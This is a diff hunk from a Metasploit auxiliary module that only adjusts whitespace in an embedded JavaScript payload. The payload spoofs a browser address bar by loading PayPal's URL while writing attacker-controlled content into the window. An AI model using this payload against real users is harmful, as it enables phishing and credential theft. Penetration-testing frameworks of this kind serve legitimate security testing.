@@ -43,10 +43,10 @@ class MetasploitModule < Msf::Auxiliary
   def setup
     @html = <<-JS
 <script type="text/javascript">
-win = window.open("sleep_one_second.php", "WIN"); 
-window.open("https://www.paypal.com", "WIN");  
-win.document.execCommand('Stop');              
-win.document.write("Spoofed URL");   
+win=window.open("sleep_one_second.php", "WIN");
+window.open("https://www.paypal.com", "WIN");
+win.document.execCommand('Stop');
+win.document.write("Spoofed URL");
 win.document.close();
 </script>
     JS
